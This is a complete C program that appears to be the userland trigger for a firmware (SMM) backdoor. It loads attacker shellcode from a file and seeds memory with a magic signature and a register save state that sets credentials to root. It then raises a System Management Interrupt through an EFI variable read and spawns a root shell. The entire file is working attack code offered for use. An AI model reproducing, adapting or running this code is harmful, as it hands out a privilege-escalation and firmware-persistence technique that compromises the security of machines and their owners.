#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/io.h>

#define BACKDOOR_MEMORY_SIGNATURE 0x4144414E4143204FL // O CANADA
#define BACKDOOR_MEMORY_SIGNATURE_SIZE 8

#define SIZE 16 * 1024 * 1024
#define PAGE_SIZE_4MIB 4 * 1024 * 1024
#define SAVE_STATE_SIZE 16 * sizeof(uint64_t)
#define MAX_SHELLCODE_SIZE 4096

// We use the Lang variable as it is likely available but any other variable 
// will do the job
#define EFI_VAR_FILEPATH "/sys/firmware/efi/efivars/Lang-8be4df61-93ca-11d2-aa0d-00e098032b8c"

typedef struct {
	uint64_t r8;
	uint64_t r9;
	uint64_t r10;
	uint64_t r11;
	uint64_t r12;
	uint64_t r13;
	uint64_t r14;
	uint64_t r15;
	uint64_t rax;
	uint64_t rbx;
	uint64_t rcx;
	uint64_t rdx;
	uint64_t rsp;
	uint64_t rbp;
	uint64_t rsi;
	uint64_t rdi;
} SaveState;


uint8_t* readShellcode(char* filePath)
{
	uint8_t* shellcode = (uint8_t*) malloc(MAX_SHELLCODE_SIZE);
	int fd = open(filePath, O_RDONLY);
	int size;

	if(fd == -1)
	{
		free(shellcode);
		return NULL;
	}

	memset(shellcode, 0x90, MAX_SHELLCODE_SIZE);
	size = read(fd, shellcode, MAX_SHELLCODE_SIZE);
	close(fd);

	printf("Read a shellcode of %d bytes (NOP filled).\n", size);

	return shellcode;
}

void initSaveState(SaveState* saveState)
{
	uint32_t uid, gid, euid, egid, suid, sgid;

	getresuid(&uid, &euid, &suid);
	getresgid(&gid, &egid, &sgid);

	printf("Current credentials are: \n");
	printf("\tuid  = %d\tgid  = %d\n", uid, gid);
	printf("\teuid = %d\tegid = %d\n", euid, egid);
	printf("\tsuid = %d\tsgid = %d\n", suid, sgid);

	saveState->r8 = (((uint64_t) uid) << 32) | gid;
	saveState->r9 = (((uint64_t) euid) << 32) | egid;
	saveState->r10 = (((uint64_t) suid) << 32) | sgid;

	// We want to get root privileges
	saveState->r11 = 0x0000000000000000L;
	saveState->r12 = 0x0000000000000000L;
	saveState->r13 = 0x0000000000000000L;
}

uint8_t* initMemory(SaveState* saveState, uint8_t* shellcode)
{
	uint8_t* buffer = (uint8_t*) malloc(SIZE);

	for(uint64_t i=0 ; i<SIZE ; i++)
	{
		if((((uint64_t)(buffer + i)) % ((uint64_t) PAGE_SIZE_4MIB)) == 0)
		{
			*(uint64_t*)(buffer + i) = BACKDOOR_MEMORY_SIGNATURE;
			memcpy(buffer + i + BACKDOOR_MEMORY_SIGNATURE_SIZE, saveState, SAVE_STATE_SIZE);
			memcpy(buffer + i + BACKDOOR_MEMORY_SIGNATURE_SIZE + SAVE_STATE_SIZE, shellcode, MAX_SHELLCODE_SIZE);
		}
	}

	return buffer;
}

void triggerSmi()
{
	uint8_t dummyBuffer;
	int fd = open(EFI_VAR_FILEPATH, O_RDONLY);

	read(fd, &dummyBuffer, 0);
	close(fd);
}

void cleanAndFree(uint8_t* buffer, size_t size)
{
	memset(buffer, 0x00, size);
	free(buffer);
}

void gotRoot()
{
	if(getuid() == 0)
	{
		printf("I'm root, I hope you have backups.\n");
		printf("Here goes your shell. Enjoie.\n");

		system("/bin/sh");
	}
	else
	{
		printf("Something failed dramatically :(.\n");
	}
}

int main(int argc, char** argv)
{
	SaveState saveState;
	uint8_t* shellcode = NULL;
	uint8_t* memory = NULL;

	if(argc != 2)
	{
		printf("Usage: %s <shellcode_file_path>\n", argv[0]);
		return 1;
	}

	shellcode = readShellcode(argv[1]);

	if(shellcode == NULL)
	{
		printf("Unable to read the shellcode.\n");
		return 1;
	}

	initSaveState(&saveState);
	memory = initMemory(&saveState, shellcode);

	triggerSmi();

	// We reach this point after the shellcode was executed in SMM
	cleanAndFree(memory, SIZE);
	gotRoot();

	return 0;
}
